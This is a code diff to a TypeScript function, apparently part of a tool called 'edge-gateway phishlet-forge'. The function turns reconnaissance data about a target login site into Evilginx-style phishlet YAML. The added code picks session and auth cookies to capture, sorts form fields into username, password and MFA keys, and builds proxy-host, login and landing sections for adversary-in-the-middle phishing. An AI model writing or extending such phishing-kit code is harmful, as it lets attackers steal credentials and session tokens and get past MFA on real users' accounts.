@@ -150,73 +150,220 @@ type ItemRow = {
 
 const STARTED_AT_KEY = "startedAt";
 
-/** Build a base Evilginx-style phishlet YAML from captured reconnaissance data. */
+/** Known auth-token cookie name patterns — matched case-insensitively. */
+const AUTH_TOKEN_PATTERNS = [
+  /session/i, /auth/i, /token/i, /sid/i, /jwt/i, /access/i, /id_token/i,
+  /refresh/i, /bearer/i, /oauth/i, /sso/i, /login/i, /sess/i, /xsrf/i,
+  /csrf/i, /_csrf/i, /connect\.sid/i, /JSESSIONID/i, /PHPSESSID/i,
+];
+
+/** Returns true when a cookie name looks like an auth/session token. */
+function isAuthTokenName(name: string): boolean {
+  return AUTH_TOKEN_PATTERNS.some((p) => p.test(name));
+}
+
+/**
+ * Identify the "main" domain from a list — the shortest non-www domain that
+ * doesn't look like a CDN, analytics, or static asset host.
+ */
+function pickMainDomain(domains: string[]): string | null {
+  const skipPatterns = [
+    /^cdn\./i, /^static\./i, /^assets\./i, /^img\./i, /^images\./i,
+    /^analytics\./i, /^metrics\./i, /^api\./i, /^ws\./i, /^sock\./i,
+    /^fonts\./i, /^media\./i, /^files\./i, /^upload/i, /^store\./i,
+  ];
+  const candidates = domains
+    .filter((d) => !skipPatterns.some((p) => p.test(d)))
+    .sort((a, b) => a.length - b.length);
+  // Prefer the shortest bare (non-www) domain.
+  for (const d of candidates) {
+    if (!d.startsWith("www.")) return d;
+  }
+  return candidates[0] ?? null;
+}
+
+/**
+ * Build a production-grade Evilginx-style phishlet YAML from captured
+ * reconnaissance data. Mirrors the sophistication of the PhishletForge
+ * Python agent: smart domain analysis, auth-token cookie detection,
+ * credential-to-key mapping, session/landing flags, login metadata,
+ * and actionable notes for manual tuning.
+ */
 function buildPhishletYaml(
   proxy: Proxy,
   captured: {
     urls?: string[];
     cookies?: string[];
-    formFields?: { name: string; type: string }[];
+    formFields?: { name: string; type: string; id?: string; placeholder?: string }[];
     redirects?: string[];
     domains?: string[];
+    /** Optional page title captured by the browser probe. */
+    pageTitle?: string;
+    /** Optional action-URL extracted from the login <form>. */
+    formAction?: string;
+    /** Optional form method extracted from the login <form>. */
+    formMethod?: string;
   },
 ): string {
   const target = new URL(proxy.targetUrl);
-  const targetHostname = target.hostname;
-  const domains = captured.domains?.length
-    ? [...new Set(captured.domains)]
-    : [targetHostname];
-  const landing = captured.redirects?.[0] ?? proxy.targetUrl;
+  const targetHost = target.hostname;
 
-  const proxyHosts = domains
-    .map((domain, index) => {
-      const isMain = index === 0;
-      const isWww = domain.startsWith("www.");
-      const phishSub = isWww ? "www" : "";
-      const bareDomain = domain.replace(/^www\./, "");
-      return `    - phish_sub: '${phishSub}'\n      orig_sub: '${phishSub}'\n      domain: '${bareDomain}'\n      session: ${isMain}`;
-    })
+  // ── domains ──────────────────────────────────────────────────────────
+  const domains = captured.domains?.length
+    ? [...new Set(captured.domains.map((d) => d.toLowerCase().trim()).filter(Boolean))]
+    : [targetHost];
+  const mainDomain = pickMainDomain(domains) ?? targetHost.replace(/^www\./, "");
+
+  // ── proxy_hosts (session flag on the landing domain only) ────────────
+  const proxyHosts = domains.slice(0, 8).map((domain, index) => {
+    const isLanding = index === 0;
+    const bare = domain.replace(/^www\./, "");
+    const phishSub = isLanding ? "login" : domain.split(".")[0].slice(0, 10);
+    const origSub = domain.startsWith("www.") ? "www" : domain.split(".")[0];
+    const isMain = bare === mainDomain;
+    return [
+      `    - phish_sub: '${phishSub}'`,
+      `      orig_sub: '${origSub}'`,
+      `      domain: '${bare}'`,
+      `      session: ${isLanding}`,
+      `      is_landing: ${isLanding}`,
+    ].join("\n");
+  }).join("\n");
+
+  // ── landing_path ─────────────────────────────────────────────────────
+  const landingCandidates = [
+    ...(captured.redirects ?? []),
+    ...(captured.urls ?? []),
+    proxy.targetUrl,
+  ].filter(Boolean).slice(0, 6);
+  const landingPath = landingCandidates
+    .map((u) => `    - '${u}'`)
     .join("\n");
 
-  const usernameKeys =
-    captured.formFields
-      ?.filter(
-        (f) =>
-          /user|email|login|username|account/i.test(f.name) &&
-          !/pass|pwd|current|old/i.test(f.name),
-      )
-      .map((f) => `    - key: '${f.name}'`)
-      .join("\n") ?? "";
+  // ── credentials — classify form fields into username / password / mfa ──
+  const fields = captured.formFields ?? [];
 
-  const passwordKeys =
-    captured.formFields
-      ?.filter(
-        (f) =>
-          f.type === "password" || /pass|pwd|password/i.test(f.name),
-      )
-      .map((f) => `    - key: '${f.name}'`)
-      .join("\n") ?? "";
+  const isUsername = (f: { name: string; type: string; id?: string; placeholder?: string }): boolean => {
+    const key = (f.name || f.id || f.placeholder || "").toLowerCase();
+    return /^(user|email|login|username|account|member|customer|handle|nick)|\.(id|name)$/i.test(key) &&
+      !/pass|pwd|current|old|pin|otp|mfa|token|code|verify/i.test(key) &&
+      f.type !== "password";
+  };
 
-  const credentials = [usernameKeys, passwordKeys].filter(Boolean).join("\n") ||
-    `    - key: 'username'\n    - key: 'password'`;
+  const isPassword = (f: { name: string; type: string; id?: string; placeholder?: string }): boolean => {
+    const key = (f.name || f.id || f.placeholder || "").toLowerCase();
+    return f.type === "password" || /pass|pwd|password|secret/i.test(key);
+  };
 
-  const authTokens = captured.cookies?.length
-    ? captured.cookies
-        .map((c) => `    - domain: '${targetHostname}'\n      name: '${c}'`)
+  const isMfa = (f: { name: string; type: string; id?: string; placeholder?: string }): boolean => {
+    const key = (f.name || f.id || f.placeholder || "").toLowerCase();
+    return /otp|mfa|2fa|totp|code|token|verify|one.?time|auth.?code/i.test(key);
+  };
+
+  const usernameLines = fields
+    .filter(isUsername)
+    .map((f) => `    - key: '${f.name || f.id || "username"}'`)
+    .join("\n");
+  const passwordLines = fields
+    .filter(isPassword)
+    .map((f) => `    - key: '${f.name || f.id || "password"}'`)
+    .join("\n");
+  const mfaLines = fields
+    .filter(isMfa)
+    .map((f) => `    - key: '${f.name || f.id || "otp"}'`)
+    .join("\n");
+
+  const credentialBlocks: string[] = [];
+  if (usernameLines) credentialBlocks.push(usernameLines);
+  if (passwordLines) credentialBlocks.push(passwordLines);
+  if (mfaLines) credentialBlocks.push(mfaLines);
+  const credentialsBlock = credentialBlocks.length > 0
+    ? credentialBlocks.join("\n")
+    : `    - key: 'username'\n    - key: 'password'`;
+
+  // ── auth_tokens — detect session/auth cookies, not all cookies ───────
+  const cookieNames = captured.cookies ?? [];
+  const authCookieNames = cookieNames.filter(isAuthTokenName);
+  const authTokenBlock = authCookieNames.length > 0
+    ? authCookieNames
+        .map((c) => `    - domain: '${mainDomain}'\n      name: '${c}'`)
         .join("\n")
-    : `    - domain: '${targetHostname}'\n      name: 'session'`;
+    : `    - domain: '${mainDomain}'\n      name: 'session'`;
 
-  const urls = captured.urls?.length
-    ? captured.urls.map((u) => `    - '${u}'`).join("\n")
-    : `    - '${proxy.targetUrl}'`;
+  // ── sub_filters — placeholder with guidance ──────────────────────────
+  const subFiltersNote = [
+    `    # --- MANUAL REVIEW REQUIRED ---`,
+    `    # Add domain rewrite rules here so absolute URLs in HTML/JS are`,
+    `    # rewritten to point through the proxy.  Common patterns:`,
+    `    #   'https://${mainDomain}'  ->  'https://{hostname}'`,
+    `    #   'https://www.${mainDomain}'  ->  'https://{hostname}'`,
+  ];
 
-  return `name: '${proxy.name}'\n` +
-    `author: edge-gateway\n` +
-    `min_version: '2.3.0'\n` +
-    `proxy_hosts:\n${proxyHosts}\n` +
-    `landing_path:\n${urls}\n` +
-    `credentials:\n${credentials}\n` +
-    `auth_tokens:\n${authTokens}\n`;
+  // ── login section ────────────────────────────────────────────────────
+  const formAction = captured.formAction ?? fields.find((f) => f.name === "" || !f.name)?.["id"] ?? "";
+  const formMethod = captured.formMethod ?? "post";
+  const loginPath = (() => {
+    try { return new URL(proxy.targetUrl).pathname || "/"; }
+    catch { return "/"; }
+  })();
+
+  // ── assemble YAML ────────────────────────────────────────────────────
+  const now = new Date().toISOString();
+  const yaml = [
+    `# =============================================================================`,
+    `#  Phishlet: ${proxy.name}`,
+    `#  Generated: ${now}`,
+    `#  Target: ${proxy.targetUrl}`,
+    `#  Agent: edge-gateway phishlet-forge (v2)`,
+    `#`,
+    `#  Auto-generated base config — ~80 % complete.`,
+    `#  Review EVERY section before use.  Complex auth flows (OAuth, SAML,`,
+    `#  WebAuthn, multi-step MFA) always require manual tuning.`,
+    `# =============================================================================`,
+    ``,
+    `name: '${proxy.name.replace(/'/g, "''")}'`,
+    `author: 'edge-gateway'`,
+    `min_ver: '3.0.0-dev'`,
+    ``,
+    `proxy_hosts:`,
+    proxyHosts,
+    ``,
+    `sub_filters:`,
+    ...subFiltersNote,
+    ``,
+    `auth_tokens:`,
+    authTokenBlock,
+    ``,
+    `credentials:`,
+    credentialsBlock,
+    ``,
+    `login:`,
+    `    domain: '${mainDomain}'`,
+    `    path: '${loginPath}'`,
+    `    origin: '${proxy.targetUrl}'`,
+    `    action_path: '${formAction}'`,
+    `    method: '${formMethod}'`,
+    ``,
+    `landing_path:`,
+    landingPath,
+    ``,
+    `# ── Recon metadata (auto-generated) ──`,
+    `generated_at: '${now}'`,
+    `page_title: '${(captured.pageTitle ?? "").replace(/'/g, "''")}'`,
+    `domains_observed: ${domains.length}`,
+    `cookies_total: ${cookieNames.length}`,
+    `auth_cookies_detected: ${authCookieNames.length}`,
+    `forms_found: ${fields.length > 0 ? 1 : 0}`,
+    `redirects_observed: ${(captured.redirects ?? []).length}`,
+    ``,
+    `# ── Raw captured data (for reference) ──`,
+    `raw_domains:`,
+    ...domains.map((d) => `    - '${d}'`),
+    `raw_auth_cookies:`,
+    ...authCookieNames.map((c) => `    - '${c}'`),
+  ].join("\n");
+
+  return yaml;
 }
 
 /** Wrap a SQL operation so errors produce a structured 500 instead of crashing the DO. */
